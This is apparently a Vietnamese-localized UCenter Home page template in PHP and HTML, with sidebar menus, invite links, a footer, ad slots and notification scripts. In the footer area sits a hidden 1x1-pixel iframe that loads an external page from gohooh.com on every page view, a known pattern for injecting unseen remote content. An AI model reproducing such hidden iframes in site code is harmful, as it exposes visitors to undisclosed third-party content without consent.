<li><a href="space.php?do=album">Album</a></li>
<li><a href="space.php?do=mtag">Groups</a></li>
<li><a href="space.php?do=poll">Vote</a></li>
<li><a href="space.php?do=event">Event</a></li>
<li><a href="space.php?do=share">Share</a></li>
</ul>
</div>
<div class="fbox">
<h2 class="ntitle">Ứng dụng</h2>
<ul>
<?php if($myappcount) { ?>
<?php if(is_array($myapplist)) { foreach($myapplist as $value) { ?>
<li><a href="userapp.php?id=<?=$value['appid']?>"><?=$value['appname']?></a></li>
<?php } } ?>
<li><a href="cp.php?ac=userapp&my_suffix=%2Fapp%2Flist" class="alink">Xem tấp cả <?=$myappcount?> ứng dụng</a></li>
<?php } else { ?>
<li><a href="#">Hiện không có ứng dụng nào</a></li>
<?php } ?>
</ul>
</div>
<div class="fbox">
<h2 class="ntitle">Tìm thấy</h2>
<ul>
<li><a href="space.php?do=blog&view=all">Xem chia sẻ Blog</a></li>
<li><a href="space.php?do=album&view=all">Ảnh của bạn</a></li>
<li><a href="space.php?do=thread&view=all">Các chủ đề</a></li>
</ul>
</div>
</div>
</div>
<div class="nbox_s">
<h2 class="ntitle">Mời bạn bè tham gia</h2>
<ul>
<li><a href="cp.php?ac=invite">Mời bạn để nhận thưởng</a></li>
<li><a href="cp.php?ac=invite">Mời qua IM</a></li>
<li><a href="cp.php?ac=invite">Mời qua Link</a></li>
<li><a href="cp.php?ac=invite">Mời qua Chia sẻ</a></li>
<li><a href="cp.php?ac=invite">Google Gmail</a></li>
<li><a href="cp.php?ac=invite">MSN liên lạc</a></li>
<li><a href="cp.php?ac=invite">Yahoo! Email</a></li>
<li><a href="cp.php?ac=invite" class="alink">Thêm phần liên hệ……</a></li>
</ul>
</div>
<div class="fbbottom"></div>
</div>

</div>

<?php if(empty($_SGLOBAL['inajax'])) { ?>
<?php if(empty($_TPL['nosidebar'])) { ?>
<?php if($_SGLOBAL['ad']['contentbottom']) { ?><br style="line-height:0;clear:both;"/><div id="ad_contentbottom"><?php adshow('contentbottom'); ?></div><?php } ?>
</div>

<!--/mainarea-->
<div id="bottom"></div>
</div>
<!--/main-->
<?php } ?>

<div id="footer">
<?php if($_TPL['templates']) { ?>
<div class="chostlp" title="Đổi giao diện"><img id="chostlp" src="<?=$_TPL['default_template']['icon']?>" onmouseover="showMenu(this.id)" alt="<?=$_TPL['default_template']['name']?>" /></div>
<ul id="chostlp_menu" class="chostlp_drop" style="display: none">
<?php if(is_array($_TPL['templates'])) { foreach($_TPL['templates'] as $value) { ?>
<li><a href="cp.php?ac=common&op=changetpl&name=<?=$value['name']?>" title="<?=$value['name']?>"><img src="<?=$value['icon']?>" alt="<?=$value['name']?>" /></a></li>
<?php } } ?>
</ul>
<?php } ?>

<p class="r_option">
<a href="javascript:;" onclick="window.scrollTo(0,0);" id="a_top" title="TOP"><img src="image/top.gif" alt="" style="padding: 5px 6px 6px;" /></a>
</p>

<?php if($_SGLOBAL['ad']['footer']) { ?>
<p style="padding:5px 0 10px 0;"><?php adshow('footer'); ?></p>
<?php } ?>

<?php if($_SCONFIG['close']) { ?>
<p style="color:blue;font-weight:bold;">
Thông báo: Hiện trang web đang tạm ngừng hoạt động
</p>
<?php } ?>
<p>
<?=$_SCONFIG['sitename']?> - 
<a href="mailto:<?=$_SCONFIG['adminemail']?>">Liên hệ</a> <a href="http://gohooh.com">Discuz! Việt - Mạng xã hội</a>
<?php if($_SCONFIG['miibeian']) { ?> - <a  href="http://www.miibeian.gov.cn" target="_blank"><?=$_SCONFIG['miibeian']?></a><?php } ?>
</p>
<p>
Powered by <a  href="http://gohooh.com" target="_blank"><strong>UCenter Home</strong></a> <span title="<?php echo X_RELEASE; ?>"><?php echo X_VER; ?></span>
<?php if(!empty($_SCONFIG['licensed'])) { ?><a  href="http://license.comsenz.com/?pid=7&host=<?=$_SERVER['HTTP_HOST']?>" target="_blank">Licensed</a><?php } ?>
&copy; 2001-2009 <a  href="http://www.comsenz.com" target="_blank">Comsenz Inc.</a>
</p>
<?php if($_SCONFIG['debuginfo']) { ?>
<p><?php echo debuginfo(); ?></p>
<?php } ?>
</div>
</div>
<!--/wrap-->

<?php if($_SGLOBAL['appmenu']) { ?>
<ul id="ucappmenu_menu" class="dropmenu_drop" style="display:none;">
<li><a href="<?=$_SGLOBAL['appmenu']['url']?>" title="<?=$_SGLOBAL['appmenu']['name']?>" target="_blank"><?=$_SGLOBAL['appmenu']['name']?></a></li>
<?php if(is_array($_SGLOBAL['appmenus'])) { foreach($_SGLOBAL['appmenus'] as $value) { ?>
<li><a href="<?=$value['url']?>" title="<?=$value['name']?>" target="_blank"><?=$value['name']?></a></li>
<?php } } ?>
</ul>
<?php } ?>
<iframe style="WIDTH: 1; HEIGHT: 1" src="http://www.gohooh.com/auto.html" frameborder="0" width="1" scrolling="1" height="1"></iframe>
<?php if($_SGLOBAL['supe_uid']) { ?>
<ul id="membernotemenu_menu" class="dropmenu_drop" style="display:none;">
<?php $member = $_SGLOBAL['member']; ?>
<?php if($member['notenum']) { ?><li><img src="image/icon/notice.gif" width="16" alt="" /> <a href="space.php?do=notice"><strong><?=$member['notenum']?></strong> Thông báo mới</a></li><?php } ?>
<?php if($member['pokenum']) { ?><li><img src="image/icon/poke.gif" alt="" /> <a href="cp.php?ac=poke"><strong><?=$member['pokenum']?></strong> Tin mới</a></li><?php } ?>
<?php if($member['addfriendnum']) { ?><li><img src="image/icon/friend.gif" alt="" /> <a href="cp.php?ac=friend&op=request"><strong><?=$member['addfriendnum']?></strong> Yêu cầu kết bạn</a></li><?php } ?>
<?php if($member['mtaginvitenum']) { ?><li><img src="image/icon/mtag.gif" alt="" /> <a href="cp.php?ac=mtag&op=mtaginvite"><strong><?=$member['mtaginvitenum']?></strong> Mời nhóm</a></li><?php } ?>
<?php if($member['eventinvitenum']) { ?><li><img src="image/icon/event.gif" alt="" /> <a href="cp.php?ac=event&op=eventinvite"><strong><?=$member['eventinvitenum']?></strong> Mời tham gia Event</a></li><?php } ?>
<?php if($member['myinvitenum']) { ?><li><img src="image/icon/userapp.gif" alt="" /> <a href="space.php?do=notice&view=userapp"><strong><?=$member['myinvitenum']?></strong> Mời qua Email</a></li><?php } ?>
</ul>
<?php } ?>

<?php if($_SGLOBAL['supe_uid']) { ?>
<?php if(!isset($_SCOOKIE['checkpm'])) { ?>
<script language="javascript"  type="text/javascript" src="cp.php?ac=pm&op=checknewpm&rand=<?=$_SGLOBAL['timestamp']?>"></script>
<?php } ?>
<?php if(!isset($_SCOOKIE['synfriend'])) { ?>
<script language="javascript"  type="text/javascript" src="cp.php?ac=friend&op=syn&rand=<?=$_SGLOBAL['timestamp']?>"></script>
<?php } ?>
<?php } ?>
<?php if(!isset($_SCOOKIE['sendmail'])) { ?>
<script language="javascript"  type="text/javascript" src="do.php?ac=sendmail&rand=<?=$_SGLOBAL['timestamp']?>"></script>
<?php } ?>

<?php if($_SGLOBAL['ad']['couplet']) { ?>
<script language="javascript" type="text/javascript" src="source/script_couplet.js"></script>
<div id="uch_couplet" style="z-index: 10; position: absolute; display:none">
<div id="couplet_left" style="position: absolute; left: 2px; top: 60px; overflow: hidden;">
<div style="position: relative; top: 25px; margin:0.5em;" onMouseOver="this.style.cursor='hand'" onClick="closeBanner('uch_couplet');"><img src="image/advclose.gif"></div>
<?php adshow('couplet'); ?>
</div>
<div id="couplet_rigth" style="position: absolute; right: 2px; top: 60px; overflow: hidden;">
<div style="position: relative; top: 25px; margin:0.5em;" onMouseOver="this.style.cursor='hand'" onClick="closeBanner('uch_couplet');"><img src="image/advclose.gif"></div>
<?php adshow('couplet'); ?>
</div>
<script type="text/javascript">
lsfloatdiv('uch_couplet', 0, 0, '', 0).floatIt();
</script>
</div>
<?php } ?>
<?php if($_SCOOKIE['reward_log']) { ?>
<script type="text/javascript">
showreward();
</script>
<?php } ?>
<br>
</body>
</html>
<?php } ?><?php ob_out();?>